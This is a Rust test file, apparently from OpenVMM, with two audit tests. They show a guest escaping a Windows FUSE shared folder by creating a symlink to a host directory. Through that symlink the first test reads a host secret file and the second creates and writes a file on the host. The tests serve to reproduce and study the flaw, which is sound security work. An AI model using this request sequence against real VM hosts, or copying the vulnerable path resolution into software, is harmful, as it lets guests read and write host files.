
#[cfg(target_os = "windows")]
#[async_test]
async fn audit_windows_raw_symlink_parent_reads_outside_share(driver: DefaultDriver) {
    let mut harness = TestHarness::new(&driver);
    let outside = tempfile::tempdir().unwrap();
    let secret = b"OPENVMM_WINDOWS_RAW_FUSE_OUTSIDE_SECRET";
    std::fs::write(outside.path().join("host-secret.txt"), secret).unwrap();

    harness.enable().await;
    harness.fuse_init(0).await;

    let symlink_payload = format!("escape\0{}\0", outside.path().display()).into_bytes();
    let resp_size = OUT_HEADER_SIZE + size_of::<fuse_entry_out>() as u32;
    let (unique, resp_gpa) = harness.post_fuse_request(
        2,
        FUSE_SYMLINK,
        FUSE_ROOT_ID,
        &symlink_payload,
        resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert!(used_len > 0);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(header.error, 0, "FUSE_SYMLINK failed on Windows backend");
    let symlink_entry: fuse_entry_out = harness.read_response(resp_gpa);
    assert_eq!(symlink_entry.attr.mode & 0o170000, 0o120000);

    let (unique, resp_gpa) = harness.post_fuse_request(
        4,
        FUSE_LOOKUP,
        symlink_entry.nodeid,
        b"host-secret.txt\0",
        resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert!(used_len > 0);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(
        header.error, 0,
        "vulnerable Windows backend should resolve below symlink inode"
    );
    let outside_entry: fuse_entry_out = harness.read_response(resp_gpa);

    let open_in = fuse_open_in { flags: 0, unused: 0 };
    let open_resp_size = OUT_HEADER_SIZE + size_of::<fuse_open_out>() as u32;
    let (unique, resp_gpa) = harness.post_fuse_request(
        6,
        FUSE_OPEN,
        outside_entry.nodeid,
        open_in.as_bytes(),
        open_resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert!(used_len > 0);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(header.error, 0, "FUSE_OPEN of outside inode failed");
    let open_out: fuse_open_out = harness.read_response(resp_gpa);

    let read_in = fuse_read_in {
        fh: open_out.fh,
        offset: 0,
        size: secret.len() as u32,
        read_flags: 0,
        lock_owner: 0,
        flags: 0,
        padding: 0,
    };
    let read_resp_size = OUT_HEADER_SIZE + secret.len() as u32;
    let (unique, resp_gpa) = harness.post_fuse_request(
        8,
        FUSE_READ,
        outside_entry.nodeid,
        read_in.as_bytes(),
        read_resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert_eq!(used_len, read_resp_size);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(header.error, 0, "FUSE_READ of outside inode failed");
    let mut got = vec![0u8; secret.len()];
    harness
        .mem
        .read_at(resp_gpa + OUT_HEADER_SIZE as u64, &mut got)
        .unwrap();
    assert_eq!(got, secret);
}

#[cfg(target_os = "windows")]
#[async_test]
async fn audit_windows_raw_symlink_parent_creates_outside_share(driver: DefaultDriver) {
    let mut harness = TestHarness::new(&driver);
    let outside = tempfile::tempdir().unwrap();
    let payload = b"OPENVMM_WINDOWS_RAW_FUSE_OUTSIDE_WRITE";

    harness.enable().await;
    harness.fuse_init(0).await;

    let symlink_payload = format!("escape\0{}\0", outside.path().display()).into_bytes();
    let entry_resp_size = OUT_HEADER_SIZE + size_of::<fuse_entry_out>() as u32;
    let (unique, resp_gpa) = harness.post_fuse_request(
        2,
        FUSE_SYMLINK,
        FUSE_ROOT_ID,
        &symlink_payload,
        entry_resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert!(used_len > 0);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(header.error, 0, "FUSE_SYMLINK failed on Windows backend");
    let symlink_entry: fuse_entry_out = harness.read_response(resp_gpa);

    let create_in = fuse_create_in {
        flags: (lx::O_WRONLY | lx::O_TRUNC) as u32,
        mode: 0o600,
        umask: 0,
        padding: 0,
    };
    let mut create_payload = create_in.as_bytes().to_vec();
    create_payload.extend_from_slice(b"guest-created.txt\0");
    let create_resp_size = OUT_HEADER_SIZE + size_of::<fuse::CreateOut>() as u32;
    let (unique, resp_gpa) = harness.post_fuse_request(
        4,
        FUSE_CREATE,
        symlink_entry.nodeid,
        &create_payload,
        create_resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert!(used_len > 0);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(
        header.error, 0,
        "vulnerable Windows backend should create below symlink inode"
    );
    let create_out: fuse::CreateOut = harness.read_response(resp_gpa);

    let write_in = fuse_write_in {
        fh: create_out.open.fh,
        offset: 0,
        size: payload.len() as u32,
        write_flags: 0,
        lock_owner: 0,
        flags: 0,
        padding: 0,
    };
    let mut write_payload = write_in.as_bytes().to_vec();
    write_payload.extend_from_slice(payload);
    let write_resp_size = OUT_HEADER_SIZE + size_of::<fuse_write_out>() as u32;
    let (unique, resp_gpa) = harness.post_fuse_request(
        6,
        FUSE_WRITE,
        create_out.entry.nodeid,
        &write_payload,
        write_resp_size,
    );
    let (_, used_len) = harness.wait_for_used().await;
    assert!(used_len > 0);
    let header = harness.read_out_header(resp_gpa);
    assert_eq!(header.unique, unique);
    assert_eq!(header.error, 0, "FUSE_WRITE of outside file failed");
    let write_out: fuse_write_out = harness.read_response(resp_gpa);
    assert_eq!(write_out.size as usize, payload.len());
    assert_eq!(
        std::fs::read(outside.path().join("guest-created.txt")).unwrap(),
        payload
    );
}
